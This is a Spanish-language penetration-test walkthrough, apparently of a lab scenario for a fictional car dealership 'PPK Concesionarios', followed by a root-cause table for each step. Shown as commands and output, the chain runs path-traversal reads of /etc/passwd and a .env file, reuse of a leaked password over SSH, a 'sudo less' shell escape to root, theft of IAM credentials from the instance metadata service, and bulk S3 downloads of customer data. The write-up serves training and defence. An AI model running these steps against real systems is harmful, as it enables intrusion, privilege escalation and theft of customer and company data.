# Cadena de ataque completa

Narrativa de principio a fin, tal y como la seguiría un pentester que solo
conoce la IP pública y el dominio de PPK Concesionarios.

## 0. Reconocimiento

```
$ nmap -p- -sV 34.201.xx.xx
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    nginx
```

`ppkconcesionario.com` resuelve (vía hosts file) a la misma IP y muestra la
web corporativa: landing, vehículos, financiación, contacto, botón "Área
privada". Nada reseñable — es la aplicación de producción y está bien
construida.

Al revisar subdominios conocidos/deducibles se encuentra
`dev.ppkconcesionario.com` sirviendo, en apariencia, la misma aplicación,
pero con un aviso visible: *"Development Environment — Internal Use Only"* y
*"Version 2.x-dev"*. Un entorno de desarrollo expuesto a internet y nunca
retirado tras el proyecto de modernización del portal.

## 1. Descubrimiento de la LFI

Navegando el entorno dev se identifica que la financiación y el manual de
usuario se descargan vía:

```
GET /download?file=manual.pdf
GET /download?file=financing_guide.pdf
```

Prueba de traversal:

```
GET /download?file=../../etc/passwd
```

Responde con el contenido de `/etc/passwd` del contenedor, revelando (entre
otras) las cuentas `ubuntu`, `deploy` y `pepe`.

## 2. Filtración del `.env`

```
GET /download?file=../.env
```

```
APP_MODE=development
SECRET_KEY=...
DATABASE_URL=mysql+pymysql://ppkapp:***@ppk-mysql.xxxxx.eu-west-1.rds.amazonaws.com:3306/ppk
S3_BUCKET_NAME=ppk-company-data-xxxxxx
AWS_REGION=eu-west-1
DEV_USERNAME=pepe
DEV_PASSWORD=Summer2025!
```

`DEV_USERNAME`/`DEV_PASSWORD` coinciden con una de las cuentas del sistema
detectadas en el paso anterior. Es razonable probar esa misma credencial
contra SSH.

## 3. Acceso SSH

```
$ ssh pepe@ppkconcesionario.com
pepe@ppkconcesionario.com's password: Summer2025!
pepe@ip-10-0-1-xx:~$
```

Funciona: el servidor permite autenticación por contraseña únicamente para
`pepe` (el resto de cuentas exige clave pública), y la contraseña filtrada
en el `.env` del entorno dev es exactamente la de esta cuenta Linux.

## 4. Escalada de privilegios

```
pepe@ip-10-0-1-xx:~$ sudo -l
Matching Defaults entries for pepe on ip-10-0-1-xx:
    ...
User pepe may run the following commands on ip-10-0-1-xx:
    (root) NOPASSWD: /usr/bin/less /var/log/ppk-portal/*.log
```

```
pepe@ip-10-0-1-xx:~$ sudo less /var/log/ppk-portal/app.log
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Shell de root completa vía GTFOBins.

## 5. Abuso del IAM Role de la instancia

Como root, se consultan las credenciales temporales del Instance Profile:

```
# TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
ppk-ec2-role
# curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ppk-ec2-role
{"AccessKeyId": "...", "SecretAccessKey": "...", "Token": "...", ...}
```

Con `aws cli` ya instalado en la instancia (o exportando esas credenciales a
cualquier máquina propia):

```
# aws s3 ls s3://ppk-company-data-xxxxxx/ --recursive
2026-03-01  brochures/catalogo-2026.pdf
2026-03-01  contracts/vehicle_financing_2026.xlsx
2026-03-01  exports/customers_export.csv
2026-03-01  finance/financial-report-q2.pdf
2026-03-01  old-config/legacy.env
```

El rol solo tiene `ListBucket`/`GetObject`, pero sobre el bucket completo,
no sobre el prefijo `brochures/` que la aplicación realmente usa.

## 6. Impacto

```
# aws s3 cp s3://ppk-company-data-xxxxxx/contracts/vehicle_financing_2026.xlsx .
# aws s3 cp s3://ppk-company-data-xxxxxx/exports/customers_export.csv .
# aws s3 cp s3://ppk-company-data-xxxxxx/finance/financial-report-q2.pdf .
# aws s3 cp s3://ppk-company-data-xxxxxx/old-config/legacy.env .
```

Un atacante que partió únicamente de una IP pública y un dominio termina con:

- shell de root en el servidor de aplicación de producción y desarrollo,
- acceso completo a la base de datos RDS de la empresa (credenciales en el `.env`),
- y descarga de contratos de financiación, la exportación completa de
  clientes, un informe financiero interno y configuración heredada de un
  servicio antiguo.

## Resumen de la causa raíz de cada salto

| Paso | Causa raíz |
|---|---|
| Recon → LFI | Entorno de desarrollo expuesto a internet y nunca retirado. |
| LFI → credenciales | Falta de validación de ruta en un endpoint de descarga, solo en dev. |
| Credenciales → SSH | Contraseña de conveniencia reutilizada entre la app y la cuenta Linux del desarrollador. |
| SSH → root | Regla de sudoers demasiado permisiva sobre un binario con escape de shell conocido (GTFOBins). |
| Root → datos de empresa | Permisos de IAM acotados a acciones de solo lectura, pero no acotados al prefijo de S3 que la aplicación realmente necesita. |

Ninguno de los pasos es, por sí solo, "el gran fallo" — es la combinación de
varios errores pequeños y plausibles lo que compromete la infraestructura
completa.
